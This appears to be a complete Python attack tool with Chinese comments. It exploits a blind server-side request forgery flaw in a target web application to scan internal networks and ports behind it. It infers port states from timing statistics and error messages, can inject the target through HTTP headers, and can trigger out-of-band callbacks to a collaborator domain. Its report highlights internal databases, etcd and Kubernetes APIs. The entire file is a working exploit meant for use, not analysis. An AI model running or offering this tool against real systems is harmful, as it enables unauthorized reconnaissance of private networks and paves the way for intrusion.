#!/usr/bin/env python3
"""
盲SSRF高级内网探测工具 v2
核心策略：统计假设检验 + 差分探测 + 多维信号融合 + 自适应基线
"""

import requests
import time
import argparse
import json
import re
import statistics
import concurrent.futures
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from collections import deque

try:
    from scipy import stats
    HAS_SCIPY = True
except ImportError:
    HAS_SCIPY = False

requests.packages.urllib3.disable_warnings()


@dataclass
class ProbeResult:
    target: str
    port: int
    samples: List[float] = field(default_factory=list)
    delta_samples: List[float] = field(default_factory=list)  # 差分样本
    status: str = "unknown"          # open / closed / down / filtered
    confidence: float = 0.0          # 0-1 置信度
    p_value: float = 1.0
    error_signal: str = ""           # 错误类型信号
    http_code: int = 0
    evidence: List[str] = field(default_factory=list)  # 多维证据


class AdvancedSSRFScanner:

    # 错误信息 → 状态映射（多维信号核心）
    ERROR_PATTERNS = {
        "open": [
            r"invalid.*response", r"malformed", r"protocol.*error",
            r"unexpected.*end", r"bad.*gateway", r"empty.*reply",
            r"reset.*by.*peer", r"connection.*reset"
        ],
        "closed": [
            r"connection.*refused", r"refused", r"econnrefused"
        ],
        "down": [
            r"timed?.*out", r"timeout", r"no.*route",
            r"unreachable", r"etimedout", r"host.*down"
        ],
    }

    def __init__(self, ssrf_url, param_name, timeout=5, concurrent=8,
                 samples=6, use_oob=None, header_inject=None):
        self.ssrf_url = ssrf_url
        self.param_name = param_name
        self.timeout = timeout
        self.concurrent = concurrent
        self.samples = samples              # 每目标采样次数
        self.use_oob = use_oob              # collaborator域名
        self.header_inject = header_inject  # 是否走header注入
        self.session = requests.Session()
        self.session.verify = False

        # 基线（滑动窗口，支持漂移检测）
        self.baseline_window = deque(maxlen=30)
        self.reference_target = "http://127.0.0.1:1/"  # 差分参考点(已知关闭)
        self.request_count = 0

    # ---------- 底层请求 ----------
    def _raw_request(self, target_url) -> Dict:
        start = time.time()
        result = {"time": 0, "code": 0, "body": "", "error": ""}
        try:
            if self.header_inject:
                # 通过Header注入（如 X-Forwarded-For / 自定义头）
                headers = {self.param_name: target_url}
                resp = self.session.get(self.ssrf_url, headers=headers,
                                        timeout=self.timeout)
            else:
                sep = '&' if '?' in self.ssrf_url else '?'
                url = f"{self.ssrf_url}{sep}{self.param_name}={target_url}"
                resp = self.session.get(url, timeout=self.timeout)

            result["time"] = time.time() - start
            result["code"] = resp.status_code
            result["body"] = resp.text[:500]  # 采集部分响应用于错误信号提取
        except requests.exceptions.Timeout:
            result["time"] = time.time() - start
            result["error"] = "timeout"
        except requests.exceptions.ConnectionError as e:
            result["time"] = time.time() - start
            result["error"] = str(e)[:200]
        except Exception as e:
            result["time"] = time.time() - start
            result["error"] = str(e)[:200]

        self.request_count += 1
        return result

    # ---------- 异常值剔除 (MAD) ----------
    @staticmethod
    def _remove_outliers(data: List[float]) -> List[float]:
        if len(data) < 3:
            return data
        med = statistics.median(data)
        mad = statistics.median([abs(x - med) for x in data])
        if mad == 0:
            return data
        threshold = 3 * 1.4826 * mad
        return [x for x in data if abs(x - med) <= threshold]

    # ---------- 多维错误信号提取 ----------
    def _extract_error_signal(self, error: str, body: str) -> str:
        text = (error + " " + body).lower()
        for status, patterns in self.ERROR_PATTERNS.items():
            for pat in patterns:
                if re.search(pat, text):
                    return status
        return ""

    # ---------- 基线校准（滑动窗口 + 漂移检测）----------
    def calibrate_baseline(self, force=False):
        # 每50次请求或首次时重新校准
        if not force and self.request_count % 50 != 0 and self.baseline_window:
            return
        print(f"[*] 校准基线 (请求数={self.request_count})...")
        for i in range(8):
            r = self._raw_request(f"http://192.0.2.{i+1}:65535/")  # TEST-NET, 必不存在
            if r["time"] > 0:
                self.baseline_window.append(r["time"])
            time.sleep(0.05)
        med = statistics.median(self.baseline_window)
        print(f"[+] 基线中位数: {med:.3f}s (窗口样本数={len(self.baseline_window)})")

    # ---------- 差分探测核心 ----------
    def probe_target(self, ip: str, port: int) -> ProbeResult:
        result = ProbeResult(target=ip, port=port)
        target_url = f"http://{ip}:{port}/"

        raw_samples = []
        delta_samples = []
        error_signals = []
        codes = []

        for _ in range(self.samples):
            # 配对采样：先参考点，后目标 → 差分消除共模抖动
            ref = self._raw_request(self.reference_target)
            tgt = self._raw_request(target_url)

            raw_samples.append(tgt["time"])
            delta_samples.append(tgt["time"] - ref["time"])
            codes.append(tgt["code"])

            sig = self._extract_error_signal(tgt["error"], tgt["body"])
            if sig:
                error_signals.append(sig)

        # 异常值剔除
        result.samples = self._remove_outliers(raw_samples)
        result.delta_samples = self._remove_outliers(delta_samples)
        result.http_code = statistics.mode(codes) if codes else 0

        # === 信号1: 多维错误信号（最高优先级，确定性最强）===
        if error_signals:
            sig_mode = statistics.mode(error_signals)
            result.error_signal = sig_mode
            result.evidence.append(f"error_signal={sig_mode}")
            if sig_mode == "closed":
                result.status = "closed"; result.confidence = 0.95
                return result
            elif sig_mode == "down":
                result.status = "down"; result.confidence = 0.90
                return result
            elif sig_mode == "open":
                result.status = "open"; result.confidence = 0.90
                result.evidence.append("protocol_error→port_open")
                return result

        # === 信号2: 统计假设检验（时间差分）===
        baseline = list(self.baseline_window)
        if HAS_SCIPY and len(result.delta_samples) >= 3 and len(baseline) >= 3:
            # 差分样本 vs 0（参考点也是关闭端口，delta应接近0代表同为关闭）
            # 用目标原始时间 vs 基线做检验
            try:
                u_stat, p_val = stats.mannwhitneyu(
                    result.samples, baseline, alternative='two-sided'
                )
                result.p_value = p_val
                result.evidence.append(f"mannwhitney_p={p_val:.4f}")
            except ValueError:
                result.p_value = 1.0

        tgt_med = statistics.median(result.samples) if result.samples else 0
        base_med = statistics.median(baseline) if baseline else 0
        delta_med = statistics.median(result.delta_samples) if result.delta_samples else 0

        # === 综合判定 ===
        # 超时接近timeout → down/filtered
        if tgt_med >= self.timeout * 0.9:
            result.status = "filtered"
            result.confidence = 0.7
            result.evidence.append(f"near_timeout({tgt_med:.2f}s)")
        elif result.p_value < 0.05:
            # 与基线有显著差异
            if tgt_med < base_med:
                # 显著快于基线 → 端口关闭(立即RST)
                result.status = "closed"
                result.confidence = min(0.9, 1 - result.p_value)
                result.evidence.append(f"faster_than_baseline(Δ={delta_med:.3f}s)")
            else:
                # 显著慢于基线 → 端口开放(应用层握手/等待)
                result.status = "open"
                result.confidence = min(0.9, 1 - result.p_value)
                result.evidence.append(f"slower_than_baseline(Δ={delta_med:.3f}s)")
        else:
            result.status = "closed"  # 与基线无差异，倾向关闭/不存在
            result.confidence = 0.4
            result.evidence.append("no_significant_diff")

        return result

    # ---------- OOB确定性探测 ----------
    def probe_oob(self, ip: str, port: int) -> Optional[bool]:
        """通过带外通道确认（需目标支持重定向跟随等二次请求）"""
        if not self.use_oob:
            return None
        marker = f"{ip.replace('.', '-')}-{port}"
        # 让内网服务返回的内容触发对collaborator的回连（依赖具体场景）
        oob_url = f"http://{ip}:{port}/redirect?url=http://{marker}.{self.use_oob}/"
        self._raw_request(oob_url)
        print(f"[OOB] 已发送探针，请在 collaborator 检查 {marker}.{self.use_oob} 的DNS/HTTP回连")
        return None

    # ---------- 网段扫描 ----------
    def scan_network(self, network: str, port: int = 80) -> List[ProbeResult]:
        self.calibrate_baseline(force=True)
        print(f"[*] 差分探测网段 {network}.0/24 端口 {port}")
        results = []
        targets = [f"{network}.{i}" for i in range(1, 255)]

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.concurrent) as ex:
            futures = {ex.submit(self.probe_target, ip, port): ip for ip in targets}
            for i, fut in enumerate(concurrent.futures.as_completed(futures), 1):
                r = fut.result()
                results.append(r)
                if r.status == "open" and r.confidence >= 0.6:
                    print(f"[+] {r.target}:{r.port} OPEN "
                          f"(conf={r.confidence:.2f}, {', '.join(r.evidence)})")
                if i % 30 == 0:
                    self.calibrate_baseline()  # 漂移检测
                    print(f"    进度 {i}/254")
        return results

    def scan_ports(self, ip: str, ports: List[int]) -> List[ProbeResult]:
        self.calibrate_baseline(force=True)
        print(f"[*] 差分探测 {ip} 的 {len(ports)} 个端口")
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.concurrent) as ex:
            futures = {ex.submit(self.probe_target, ip, p): p for p in ports}
            for fut in concurrent.futures.as_completed(futures):
                r = fut.result()
                results.append(r)
                if r.status == "open" and r.confidence >= 0.6:
                    print(f"[+] {r.target}:{r.port} OPEN "
                          f"(conf={r.confidence:.2f}) {r.evidence}")
        return results

    def report(self, results: List[ProbeResult]):
        opens = [r for r in results if r.status == "open" and r.confidence >= 0.6]
        print("\n" + "=" * 64)
        print(f"探测报告  总目标={len(results)}  高置信开放={len(opens)}")
        print("=" * 64)
        hv = {6379: "Redis", 9200: "Elasticsearch", 3306: "MySQL",
              5432: "PostgreSQL", 27017: "MongoDB", 11211: "Memcached",
              2379: "etcd", 8500: "Consul", 6443: "K8s-API"}
        for r in sorted(opens, key=lambda x: (x.target, x.port)):
            tag = f" ⚠️ {hv[r.port]}" if r.port in hv else ""
            print(f"  {r.target}:{r.port}  conf={r.confidence:.2f}{tag}")
            print(f"      证据: {', '.join(r.evidence)}")


COMMON_PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200,
                27017, 11211, 2379, 8500, 6443, 5984, 9000]


def main():
    p = argparse.ArgumentParser(description="盲SSRF高级探测工具 v2")
    p.add_argument('-u', '--url', required=True)
    p.add_argument('-p', '--param', required=True)
    p.add_argument('-n', '--network')
    p.add_argument('-t', '--target')
    p.add_argument('-P', '--common-ports', action='store_true')
    p.add_argument('--ports')
    p.add_argument('--port', type=int, default=80)
    p.add_argument('--samples', type=int, default=6, help='每目标采样次数')
    p.add_argument('--timeout', type=int, default=5)
    p.add_argument('--concurrent', type=int, default=8)
    p.add_argument('--header-inject', action='store_true',
                   help='通过HTTP头注入(如X-Forwarded-For)')
    p.add_argument('--oob', help='collaborator域名，启用OOB确定性确认')
    args = p.parse_args()

    if not HAS_SCIPY:
        print("[!] 未安装scipy，将退化为中位数比较。建议: pip install scipy")

    scanner = AdvancedSSRFScanner(
        args.url, args.param, timeout=args.timeout,
        concurrent=args.concurrent, samples=args.samples,
        use_oob=args.oob, header_inject=args.header_inject
    )

    results = []
    if args.network:
        results = scanner.scan_network(args.network, args.port)
        opens = list({r.target for r in results
                      if r.status == "open" and r.confidence >= 0.6})
        if args.common_ports and opens:
            print(f"\n[*] 对 {len(opens)} 个存活主机深度端口探测")
            for h in opens:
                results += scanner.scan_ports(h, COMMON_PORTS)
    elif args.target:
        ports = ([int(x) for x in args.ports.split(',')] if args.ports
                 else COMMON_PORTS if args.common_ports else [args.port])
        results = scanner.scan_ports(args.target, ports)

    scanner.report(results)


if __name__ == '__main__':
    main()
